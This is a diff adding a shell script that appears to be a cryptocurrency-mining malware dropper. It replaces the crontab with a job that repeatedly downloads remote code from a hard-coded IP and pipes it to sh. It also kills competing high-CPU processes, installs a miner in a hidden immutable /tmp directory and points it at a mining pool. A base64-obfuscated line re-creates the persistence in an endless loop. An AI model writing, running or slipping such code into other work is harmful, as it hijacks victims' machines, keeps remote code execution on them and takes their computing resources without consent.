@@ -1,0 +1,28 @@
+#!/bin/sh
+crontab -r || true && \
+echo "*/55 * * * * (curl -s http://185.164.72.119/log_check.bin||wget -q -O- http://185.164.72.119/log_check.bin)|sh" > /tmp/cron || true && \
+crontab /tmp/cron || true && \
+rm -rf /tmp/cron || true && \
+ps aux | grep -vw pippip | awk '{if($3>60.0) print $2}' > /tmp/proc && while read procid; do kill -9 $procid; done < /tmp/proc
+ps -fe | grep -w pippip | grep -v grep
+if [ $? -eq 0 ]
+then
+pwd
+else
+chattr -i /tmp/.x/.
+rm -rf /tmp/.x
+crontab -r || true && \
+echo "*/55 * * * * (curl -s http://185.164.72.119/log_check.bin||wget -q -O- http://185.164.72.119/log_check.bin)|sh" > /tmp/cron || true && \
+crontab /tmp/cron || true && \
+rm -rf /tmp/cron || true && \
+mkdir /tmp/.x
+curl -o /tmp/.x/pippip http://185.164.72.119/luk-cpu || wget -O /tmp/.x/pippip http://185.164.72.119/luk-cpu
+chmod 777 /tmp/.x/pippip
+cd /tmp/.x
+/sbin/sysctl -w vm.nr_hugepages=1000
+chattr +i /tmp/.x/pippip
+/tmp/.x/pippip -o suxsuxsux.com:3333 --rig-id Linux_New --donate-level=1 -B >/dev/null &
+fi
+echo$IFS$()dGVzdCAtZiAvdG1wLzIgfHwgd2hpbGUgOjsgZG8gY3JvbnRhYiAtciB8fCB0cnVlICYmIGVjaG8gIiovNTUgKiAqICogKiAoY3VybCAtcyBodHRwOi8vMTg1LjE2NC43Mi4xMTkvbG9nX2NoZWNrLmJpbnx8d2dldCAtcSAtTy0gaHR0cDovLzE4NS4xNjQuNzIuMTE5L2xvZ19jaGVjay5iaW4pfHNoIiA+IC90bXAvY3JvbiB8fCB0cnVlICYmIGNyb250YWIgL3RtcC9jcm9uIHx8IHRydWUgJiYgcm0gLXJmIC90bXAvY3JvbiB8fCB0cnVlOyB0b3VjaCAvdG1wLzI7IGRvbmUgPi9kZXYvbnVsbCAm|base64$IFS$()-d|sh
+echo "runing....."
+
